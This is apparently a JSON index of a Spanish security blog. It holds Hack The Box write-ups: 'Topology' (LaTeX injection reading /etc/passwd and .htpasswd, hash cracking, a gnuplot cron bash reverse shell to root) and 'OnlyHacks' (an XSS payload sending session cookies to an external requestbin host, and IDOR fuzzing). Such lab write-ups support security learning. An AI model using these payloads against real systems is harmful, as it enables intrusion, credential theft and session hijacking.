
[{"content":" ¿Qué son las Máquinas en Hack The Box? # Las Máquinas en Hack The Box son entornos virtuales que simulan sistemas reales con vulnerabilidades. El objetivo es explotar estas vulnerabilidades para obtener acceso al sistema y escalar privilegios hasta convertirte en root o administrador. Cada máquina tiene un nivel de dificultad (fácil, medio, difícil) y cubre una amplia gama de técnicas, como:\nEscaneo de puertos y enumeración de servicios. Explotación de vulnerabilidades conocidas. Escalada de privilegios. Uso de herramientas como Nmap, Metasploit, Burp Suite, entre otras. ¿Qué son los Challenges en Hack The Box? # Los Challenges son desafíos independientes que se centran en habilidades específicas, como:\nCriptografía: Descifrar mensajes o romper algoritmos. Reversing: Analizar y entender el funcionamiento de binarios. Web Exploitation: Explotar vulnerabilidades en aplicaciones web. Forensics: Analizar datos para encontrar información oculta. OSINT: Recopilar información de fuentes abiertas. Estos desafíos son ideales para practicar habilidades específicas y aprender nuevas técnicas.\nMis Páginas de Challenges y Máquinas # A continuación, puedes encontrar los enlaces a mis páginas de Challenges y Maquinas:\nChallenges # Ver todos los Challenges Máquinas # Ver todas las Máquinas ","date":"22 febrero 2025","externalUrl":null,"permalink":"/htb/","section":"Loaxert","summary":"¿Qué son las Máquinas en Hack The Box?","title":"Hack The Box","type":"section"},{"content":"","date":"22 febrero 2025","externalUrl":null,"permalink":"/","section":"Loaxert","summary":"","title":"Loaxert","type":"page"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/apache2/","section":"Tags","summary":"","title":"Apache2","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/crontabs/","section":"Tags","summary":"","title":"Crontabs","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/file-read/","section":"Tags","summary":"","title":"File-Read","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/latex/","section":"Tags","summary":"","title":"Latex","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/linux/","section":"Tags","summary":"","title":"Linux","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/maquinas/","section":"Máquinas","summary":"","title":"Máquinas","type":"maquinas"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/pspy64/","section":"Tags","summary":"","title":"Pspy64","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/subdominio/","section":"Tags","summary":"","title":"Subdominio","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/sudo/","section":"Tags","summary":"","title":"Sudo","type":"tags"},{"content":"","date":"21 febrero 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root Dificultad: Facil\nEnumeración # sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts -p- Escanea todos los puertos 1-65535 . —open Solo muestra los puertos que esten abiertos. -sS Stealt scan cambia el modo de escane haciendo que no se complete el hanshake. —min-rate 5000 Como minimo va a enviar 5000 paquetes por segundo. -vvv Aumenta la verbosidad mostrando la maxima informacion posible mientras se ejecuta. -n Desactiva la resolucion DNS no va a tratar de resolver los nombres de dominio. -Pn Nmap por default manda un ping a la ip esto lo desactiva. -oG allPorts Guarda el escaneo en formato oG en el archivo llamado allPorts. Este escaneo nos dio dos puertos el 22 y el 80 vamos a hacer un escaneo mas exhaustivo a estos puertos.\nsudo nmap -sCV -p22,80 IP -A -oN target -sCV Esto ejecuta una serie de scripts predeterminados de nmap para obtener información adicional sobre los servicios que se encuentran abiertos, como versiones de servicios, detalles del sistema operativo, vulnerabilidades conocidas y la version exacta. -p22, 80 Especifica que puertos se van a escanear. -A Activa el descubrimiento de sistema operativo, la deteccion de version, script scanning y hace un traceroute. La pagina http que esta en el puerto 80 usa Apache 2.4.41\nPuerto 80 # Al momento de entrar a el link “Latex Equation Generator” es un subdmonio por lo que tendremos que agregarlo al /etc/hosts para que nos muestre lo siguiente.\nAlgo que podemos tratar es listar los archivos dentro de este subdmonio por lo que vamos a ingresar a la siguiente url http://latex.topology.htb/ dejando el ultimo / .\nRevisando los archivos lo unico util esta en equationtest.tex ya que nos muestra como estan tratando la entrada Latex la web.\n\\documentclass{standalone} \\input{header} \\begin{document} $ \\int_{a}^b\\int_{c}^d f(x,y)dxdy $ \\end{document} Podemos observar que la entrada esta entre los signos dolar, leyendo la pagina nos dicen que latex esta en el modo “inline math” buscando acerca de este modo nos encontramos que hay tres formas de tratar este modo:\n$ . . .$ \\begin{math} . . . \\end{math} ( . . . ) Foothold # Por lo que ahora sabemos porque esta entre esos signos y confirmamos que la entrada va a estar así planeando una inyección.\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection\nVamos a tratar de empezar a leer archivos del sistema con la inyección de codigo.\n$ \\lstinputlisting{/etc/passwd} $ Una vez confirmamos que podemso leer archivos vamos a empezar a leer archivos de configuracion que nos permitan ingresar al sistema.\n$ \\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf} $ En este archivo encontramos varios directorios entre ellos uno que pertence al subdominio dev.topology.htb lo agregamos al /etc/hosts y al ingresar nos pide una contraseña.\nVamos a listar archivos de configuracion por default de apache sobre el directorio correspondiente a este subdominio.\n$ \\lstinputlisting{/var/www/dev/.htaccess} $ Por ultimo vamos a listar este archivo.\n$ \\lstinputlisting{/var/www/dev/.htpasswd} $ Nos vamos a encontrar un usuario junto con su hash, vamos a copiarlo y guardarlo en un archivo .txt para hacerle fuerza bruta con hashcat:\nhashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt --user Esto nos dara su contraseña para iniciar sesion mediante ssh.\nRoot # Enumeración # Primero vamos a hacer el tratamiento de la shell\nexport TERM=xterm Listo ahora vamos a tratar de listar archivos y permisos a ver si encontramos algo, pero nos daremos cuenta rapidamente que no tenemos permitido el uso de sudo ni ningun permiso extraño por lo que lo unico que tiene algo interesante son las crontab pero no nos permite listarlas por lo que vamos a usar la herramienta Pspy https://github.com/DominicBreuker/pspy/tree/master.\n#Maquina atacante python3 -m http.server 80 #Maquina victima wget IP/pspy64 chmod +x pspy64 ./pspy64 Luego de ejecutar el ultimo comando si esperamos un rato podremos ver que hay una script que se ejecuta cada minuto /opt/gnuplot/getdata.sh .\nSi analizamos esta salida nos daremos cuenta que lo que se esta haciendo cada minuto es buscar en el directorio /opt/gnuplot/ todos los archivos con extension plt y los ejecuta.\nSi tratamos de ingresar al directorio no nos lo permite pero en cambio si creamos un archivo y lo movemos a esa direccion no habra ningun conflicto. Buscando escalaciones de privilegios con gnuplot que es el binario que se ejecuta encontramos la siguiente https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/gnuplot-privilege-escalation.\n#Maquina atacante nc -lvnp 4444 #Maquina victima nano rev.plt system \u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34; mv rev.plt /opt/gnuplot/ Con esto tendremos acceso como root y habremos completado la maquina.\n","date":"21 febrero 2025","externalUrl":null,"permalink":"/maquinas/topology/topology/","section":"Máquinas","summary":"Una maquina en la que tenemos que hacer una inyeccion latex para poder leer archivos y asi conseguir el hash del usuario para luego mediante una tarea recurrente ganar root Dificultad: Facil","title":"Topology","type":"maquinas"},{"content":"","date":"20 febrero 2025","externalUrl":null,"permalink":"/tags/insecure-direct-object-reference-idor/","section":"Tags","summary":"","title":"Insecure Direct Object Reference (IDOR)","type":"tags"},{"content":"","date":"20 febrero 2025","externalUrl":null,"permalink":"/challenges/","section":"Máquinas","summary":"","title":"Máquinas","type":"challenges"},{"content":"Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.\nDentro podremos ver una web de citas en la que la unica persona interesante es Renata ya que nos dice que siempre esta conectada, por lo que le vamos a dar match y vamos a hablar con ella.\nEn este punto hay dos formas de resolver la maquina una es haciendo un Cross-Site-Scripting yla otra es modifcando la url ya que podemos ver que cada chat tiene un id.\nVamos a mostrar la primera si tratamos de usar un titulo html en la conversacion con renata este respondera al contenido:\n\u0026lt;h1\u0026gt;Hi\u0026lt;/h1\u0026gt; Vamos a tratar de consegir la cookie de su sesion con el siguiente comando:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://requestbin.whapi.cloud/19bdo3d1? c=\u0026#39;+document.cookie\u0026lt;/script\u0026gt; Vamos a ir a esta pagina http://requestbin.whapi.cloud/ crearemos una nueva request y remplazaremos la url en el comando, si hace click en el link y recargamos la pagina de la request tendremos lo siguiente:\nRemplazaremos esa cookie en el navegador usando inspeccionar y podremos ver los chats de renata junto con la flag.\nAhora vamos con la segunda forma\nCuando entramos al chat de renata podemos ver como la url es:\nhttp://94.237.55.96:37246/chat/?rid=6 Si cambiamos el valor del seis podremos ver otros chats hay una forma de probar esto de manera automatica con ffuf para verificar que sea un IDOR\n#Creamos el diccionario sed 1 100 \u0026gt; id.txt ffuf -w id.txt -u \u0026#39;http://94.237.55.96:37246/chat/?rid=FUZZ\u0026#39; -H \u0026#34;Cookie: session=TUCOOKIE\u0026#34; -mc 200 Esto nos devolvio dos posibles chats pero uno es el nuestro por lo que si probamos con el otro tendremos la flag.\n","date":"20 febrero 2025","externalUrl":null,"permalink":"/challenges/onlyhacks/onlyhacks/","section":"Máquinas","summary":"Al ingresar a la url tenemos la opcion de registrarnos y logearnos que es lo primero que vamos a hacer.","title":"OnlyHacks","type":"challenges"},{"content":"","date":"20 febrero 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"20 febrero 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]